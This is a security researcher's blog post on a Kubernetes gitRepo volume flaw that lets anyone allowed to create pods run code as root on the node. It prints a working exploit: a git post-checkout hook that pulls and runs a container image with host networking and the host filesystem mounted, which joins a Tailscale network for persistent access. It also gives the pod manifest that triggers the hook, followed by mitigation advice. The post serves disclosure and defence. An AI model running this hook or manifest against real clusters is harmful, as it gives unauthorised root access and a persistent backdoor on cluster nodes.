---
layout: post
title: "Fun With GitRepo Volumes" 
date: 2024-07-10 18:27:00 +0100
comments: false
categories: Kubernetes
---

On Monday this week I noticed a new and really interesting blog from [Imre Rad](https://x.com/ImreRad). The [Blog Post](https://irsl.medium.com/sneaky-write-hook-git-clone-to-root-on-k8s-node-e38236205d54) described an unpatched issue in Kubernetes, which allows any user with the ability to create `gitRepo` volumes to execute code on the underlying host as the `root` user! For the details of how this works, please read Imre's blog as all the cool research is his, I'm just looking at how it might be exploited :)

## Pre-requisites

So the first thing to check is, what do I need to be in place for this issue to be exploited. First up we need the [gitRepo](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo) volume type to be available. This has been deprecated since Kubernetes 1.11, which is a long time ago, but critically it's not been removed from Kubernetes. In my experiments so far I've not found a single distribution that didn't support it, so that's good.

Next up, we need the `git` binary to be present on the node, as this volume type directly uses the `git` binary. From what I've seen so far this is a pretty common configuration, with GKE standard, AKS, and RKE all having it present. A default EKS install didn't but of course I'd guess it could be added if a cluster admin found they needed it. It also wasn't present in KinD cluster by default, so for my demo I had to add it :D

The last part of the puzzle is user rights. The user who exploits this needs to have `create` rights on `pods` and also not be blocked from using the `gitRepo` volume type. That volume type is not blocked in [baseline PSS](https://kubernetes.io/docs/concepts/security/pod-security-standards/) (at the moment), but isn't allowed in the restricted profile, so it's possible this wouldn't work, but I'd guess quite a few clusters don't block it.

## Exploiting the vulnerability

So now we know what we need, what can we do with this? Well I was wondering if I could do something based on my earlier research on [Using Tailscale for persistence](https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/), and create a pod that automatically joins a Tailnet as a bot. 

To do this we'll need a Docker image that, when run, starts Tailscale and joins the network. That could be kind of risky as we'll need to embed an Auth key, but fortunately Tailscale provides [one-off](https://tailscale.com/kb/1085/auth-keys#types-of-auth-keys) auth keys that will only function a single time. Also we can use Tailscale ACLs to ensure that when a victim joins, they can't actually reach anything else on the tailnet.

Next we'll need to modify Imre's [PoC](https://github.com/irsl/g). This turns out to be a lot more simple than I thought. Basically you just put any commands you want in the [post-checkout](https://github.com/raesene/repopodexploit/blob/main/hooks/post-checkout) script.

In my example I create a Containerd namespace, then pull my Tailscale joining image, and then run it with host networking, and mounting the host's root filesystem into the container, which looks a bit like this

```
#!/bin/sh
ctr namespace create sys_net_mon
ctr -n sys_net_mon images pull docker.io/raesene/gitrepodemo:latest
ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/gitrepodemo:latest sys_net_mon
```

Then we just need a manifest that has a `gitRepo` volume which references the repository with our script. For that we just modify Imre's PoC with our forked repository.


```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: alpine:latest
    command: ["sleep","86400"]
    name: test-container
    volumeMounts:
    - mountPath: /gitrepo
      name: gitvolume
  volumes:
  - name: gitvolume
    gitRepo:
      directory: g/.git
      repository: https://github.com/raesene/repopodexploit.git
      revision: main
```

## Pulling it all together

So what does this all look like when you run it. Well like most console exploits, not that fancy, but it does demonstrate how someone can go from having `create` pod rights to `root` on a node, in a single command.

<iframe width="560" height="315" src="https://www.youtube.com/embed/9IyowCL8Gd0?si=VkE0n8pDHNegZ1_s" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## Preventing this!

So how do you stop this happening to your cluster. There is a [PR](https://github.com/kubernetes/kubernetes/pull/124531) that Imre wrote to fix this. At the moment that's looking like it will be added to all supported versions of Kubernetes (back to 1.28).

Until that patched version is in place, you can use admission control to block the `gitRepo` Volume types. If you have access to ValidatingAdmissionPolicy, then there's a CEL expression in the [volume description](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo). Alternatively it should be possible to block this with other common admission control solutions.

A hack fix would be to remove the `git` binary from your nodes, but that's not really a great solution...

## Conclusion

This is an interesting issue, as it's not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!